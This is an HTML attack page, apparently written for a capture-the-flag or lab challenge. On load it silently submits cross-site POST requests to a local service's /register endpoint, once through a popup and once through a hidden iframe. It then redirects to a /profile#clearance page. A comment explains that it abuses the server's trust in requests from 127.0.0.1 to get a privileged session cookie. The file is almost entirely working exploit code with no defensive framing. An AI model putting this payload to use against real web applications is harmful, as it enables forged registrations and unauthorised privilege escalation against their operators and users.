<!doctype html>
<html><head><meta charset="utf-8"><title>load</title></head>
<body style="margin:0;background:#fff">
<iframe id="busy" src="https://httpbin.org/delay/9" style="position:absolute;left:-9999px;width:1px;height:1px"></iframe>
<script>
var REG = 'http://127.0.0.1:3000/register';
var PROFILE = 'http://127.0.0.1:3000/profile#clearance';
var u = 'din' + Date.now() + Math.floor(Math.random()*9999);
var p = 'Pw' + Date.now();
var FORM = '<form id="f" method="POST" action="' + REG + '">' +
  '<input name="username" value="' + u + '">' +
  '<input name="password" value="' + p + '">' +
  '</form><script>document.getElementById("f").submit();<\/scr'+'ipt>';
// first-party REGISTER (internal req.ip=127.0.0.1) in a popup -> sets shared cookie
try {
  var w = window.open('', 'rg', 'width=200,height=200');
  if (w) { w.document.open(); w.document.write(FORM); w.document.close(); }
} catch(e){}
// fallback same-window iframe register
try {
  var f2 = document.createElement('iframe');
  f2.name='rf2'; f2.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
  document.body.appendChild(f2);
  var frm = document.createElement('form');
  frm.method='POST'; frm.action=REG; frm.target='rf2';
  frm.innerHTML='<input name=username value="'+u+'x"><input name=password value="'+p+'">';
  document.body.appendChild(frm); frm.submit();
} catch(e){}
setTimeout(function(){ window.location.href = PROFILE; }, 2600);
</script>
</body></html>
